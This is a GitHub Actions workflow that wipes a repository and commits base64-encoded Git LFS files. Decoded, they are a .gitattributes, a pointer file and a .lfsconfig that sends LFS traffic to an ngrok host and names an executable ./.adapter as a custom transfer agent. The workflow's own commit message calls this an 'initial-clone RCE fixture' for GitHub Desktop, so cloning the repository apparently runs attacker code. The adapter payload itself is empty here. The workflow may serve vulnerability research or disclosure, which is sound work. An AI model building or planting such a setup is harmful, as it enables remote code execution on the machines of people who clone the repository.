name: Install GitHub Desktop initial-clone fixture
on:
  push:
permissions:
  contents: write
jobs:
  bootstrap:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Commit one-click Clone fixture
        env:
          ADAPTER_B64: 
          ATTRIBUTES_B64: ei1sZnMuYmluIGZpbHRlcj1sZnMgZGlmZj1sZnMgbWVyZ2U9bGZzIC10ZXh0Cg==
          LFSCONFIG_B64: W2xmc10KCXVybCA9IGh0dHBzOi8vNDNlYS0yNjAxLTY0NC04NTgwLWIxMjAtOWQzNC1hOWI3LTM0NTYtNWViLm5ncm9rLWZyZWUuYXBwL2luZm8vbGZzCltsZnMgImN1c3RvbXRyYW5zZmVyLnNlbnRpbmVsLnBhdGgiXQoJYWNjZXNzID0gLi8uYWRhcHRlcgo=
          POINTER_B64: dmVyc2lvbiBodHRwczovL2dpdC1sZnMuZ2l0aHViLmNvbS9zcGVjL3YxCm9pZCBzaGEyNTY6YmJlZWJkODc5ZTFkZmY2OTE4NTQ2ZGMwYzE3OWZkZGU1MDVmMmEyMTU5MWM5YTljOTZlMzZiMDU0ZWM1YWY4MwpzaXplIDEK
          README_B64: 
        run: |
          git rm -r --ignore-unmatch .github .yarn adapter package.json
          printf '%s' "$ADAPTER_B64" | base64 -d > .adapter
          printf '%s' "$ATTRIBUTES_B64" | base64 -d > .gitattributes
          printf '%s' "$LFSCONFIG_B64" | base64 -d > .lfsconfig
          printf '%s' "$POINTER_B64" | base64 -d > z-lfs.bin
          printf '%s' "$README_B64" | base64 -d > README.md
          chmod 755 .adapter
          git config user.name "GitHub Desktop LFS test bootstrap"
          git config user.email "github-desktop-lfs-test@users.noreply.github.com"
          git -c filter.lfs.clean= -c filter.lfs.smudge= -c filter.lfs.process= -c filter.lfs.required=false add -A
          git commit -m "Install GitHub Desktop initial-clone RCE fixture"
          git push --no-verify
